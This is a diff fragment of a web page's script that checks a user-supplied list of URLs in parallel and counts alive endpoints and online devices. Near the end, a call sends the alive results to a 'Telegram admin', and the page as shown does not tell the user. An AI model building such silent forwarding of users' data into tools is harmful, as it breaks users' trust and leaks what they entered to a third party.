+    const now = Date.now();
+    if (now - lastUIUpdate > 80 || info.completed === info.total) {
+      lastUIUpdate = now;
+      updateLiveCounter(info);
+      updateProgress(info.completed, info.total);
+    }
+  };
+
+  const { results, cancelled } = await parallelFetch(valid, CONCURRENCY, onProgress);
+
+  const grand = { total: 0, online: 0, offline: 0, alive: 0, dead: 0 };
+  const aliveResults = [];
+  for (const r of results) {
+    if (r && r.status === 'alive') {
+      grand.total += r.total;
+      grand.online += r.online;
+      grand.offline += r.offline;
+      grand.alive++;
+      if (r.online >= 1) aliveResults.push(r);
+    } else {
+      grand.dead++;
+    }
+  }
+
+  currentResults = results;
+  currentGrand = grand;
+
+  updateProgress(valid.length, valid.length);
+  updateLiveCounter({ completed: valid.length, total: valid.length, alive: grand.alive, dead: grand.dead, pending: 0, startTime: Date.now() - 1000 });
+
+  renderResults();
+  resultDiv.classList.add('show');
+  refreshBtn.classList.add('show');
+
+  countBtn.disabled = false;
+  countBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg> Count All Devices';
+  stopBtn.style.display = 'none';
+  isCounting = false;
+
+  // Send alive results to Telegram admin
+  sendAliveToTelegram(aliveResults);
+
+  if (cancelled) {
+    errorBox.innerHTML = '<div class="error" style="background:rgba(234,179,8,.08);border-color:rgba(234,179,8,.25);color:var(--y);">⏹ Stopped at ' + grand.alive + ' alive, ' + grand.dead + ' dead</div>';
+    setTimeout(() => { errorBox.innerHTML = ''; }, 4000);
+  }
+}
+
+stopBtn.onclick = () => { if (isCounting) { cancelFlag = true; stopBtn.textContent = '⏹ Stopping...'; } };
+countBtn.onclick = doCount;
+refreshBtn.onclick = doCount;
+
+urlsInput.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) { e.preventDefault(); doCount(); }
+});
+
+// ============================================================
+// INIT
+// ============================================================
+initGate();
+loadUrls();
+</script>
+</body>
+</html>
